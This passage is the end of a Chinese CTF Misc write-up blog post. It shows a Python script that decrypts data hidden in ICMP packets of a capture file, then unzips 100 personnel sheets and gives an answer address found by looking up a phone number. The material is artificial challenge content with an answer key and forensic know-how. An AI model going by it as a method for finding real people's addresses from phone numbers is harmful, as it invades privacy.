</span></span><span class=line><span class=cl>        <span class=n>test_ct1</span> <span class=o>=</span> <span class=n>ct1</span> <span class=k>if</span> <span class=n>j</span> <span class=o>==</span> <span class=mi>0</span> <span class=k>else</span> <span class=n>ct1</span><span class=p>[:</span><span class=o>-</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cipher1</span> <span class=o>=</span> <span class=n>ChaCha20_Poly1305</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=n>recoverer</span><span class=o>.</span><span class=n>key_layer1</span><span class=p>,</span> <span class=n>nonce</span><span class=o>=</span><span class=n>nonce1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>decrypted</span> <span class=o>=</span> <span class=n>cipher1</span><span class=o>.</span><span class=n>decrypt_and_verify</span><span class=p>(</span><span class=n>test_ct1</span><span class=p>,</span> <span class=n>tag1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>decrypted</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=n>orig_len</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>decrypted</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>final_data</span> <span class=o>=</span> <span class=n>decrypted</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>4</span> <span class=o>+</span> <span class=n>orig_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Layer 1 解密成功! 原始文件长度: </span><span class=si>{</span><span class=n>orig_len</span><span class=si>}</span><span class=s2> 字节&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>final_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Layer 1 解密失败。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>output_name</span> <span class=o>=</span> <span class=s2>&#34;recovered.bin&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_name</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>final_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 任务完成! 文件已保存为: </span><span class=si>{</span><span class=n>output_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pcap</span> <span class=o>=</span> <span class=s2>&#34;icmp.pcap&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>solve_pcap</span><span class=p>(</span><span class=n>pcap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># [*] 正在加载流量包 icmp.pcap ...</span>
</span></span><span class=line><span class=cl>    <span class=c1># [*] 正在提取 ICMP Payload（仅 echo-request type=8）...</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 找到元数据块! ID: 4660, Seq: 22136</span>
</span></span><span class=line><span class=cl>    <span class=c1># [*] Crypto Seed: 63c045c27938d319c4bf1efc80fd6d80</span>
</span></span><span class=line><span class=cl>    <span class=c1># [*] Scramble Seed: 0x6cfb72 (7142258)</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 成功提取到 146585 个有效加密块</span>
</span></span><span class=line><span class=cl>    <span class=c1># [*] 正在尝试解密 Layer 2 (AES-GCM)...</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] Layer 2 解密成功! (剔除了 178 字节填充)</span>
</span></span><span class=line><span class=cl>    <span class=c1># [*] 正在尝试解密 Layer 1 (ChaCha20-Poly1305)...</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] Layer 1 解密成功! 原始文件长度: 32834798 字节</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 任务完成! 文件已保存为: recovered.bin</span></span></span></code></pre></td></tr></table></div></div><p>然后010打开恢复后的文件，发现是个zip，因此改后缀为.zip后解压</p><p>解压后可以得到100张人员信息表</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113200153729.png alt=/posts/bb1da35/imgs/image-20260113200153729.png height=912 width=1476></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113200137359.png alt=/posts/bb1da35/imgs/image-20260113200137359.png height=1416 width=1523></p><p>可以人眼去找，也可以写脚本或者直接WPS图片转文字</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113200347902.png alt=/posts/bb1da35/imgs/image-20260113200347902.png height=1098 width=1713></p><p>最后直接搜索题目要求的手机号即可得到第三题的答案：<code>江苏省南京市鼓楼区西湖路200号梧桐里15栋4单元101室</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113200543129.png alt=/posts/bb1da35/imgs/image-20260113200543129.png height=1259 width=1763></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2026-01-13 15:20:11">更新于 2026-01-13&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/bb1da35/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/bb1da35/ data-title=星球朋友们问的一些来路不明的题 data-hashtags=CTF,Misc><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/bb1da35/ data-hashtag=CTF><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/bb1da35/ data-title=星球朋友们问的一些来路不明的题><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a><a href=/tags/misc/ class=post-tag title="标签 - Misc">Misc</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/d0736a7/ class=post-nav-item rel=prev title='CTF-Misc "雅"题共赏'><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>CTF-Misc "雅"题共赏</a><a href=/posts/1ad9200/ class=post-nav-item rel=next title="[持续更新] CTF-Misc Guide">[持续更新] CTF-Misc Guide<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment><script src=https://giscus.app/client.js data-repo=goodlunatic/goodlunatic.github.io data-repo-id=R_kgDOQHqgBw data-category=Announcements data-category-id=DIC_kwDOQHqgB84Cw_4D data-mapping=pathname data-strict=0 data-theme=preferred_color_scheme data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-loading=lazy crossorigin=anonymous async defer></script></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/ rel="external nofollow noopener noreferrer">giscus</a>.</noscript></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2026</span><span class=author itemprop=copyrightHolder>
<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/bb1da35/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>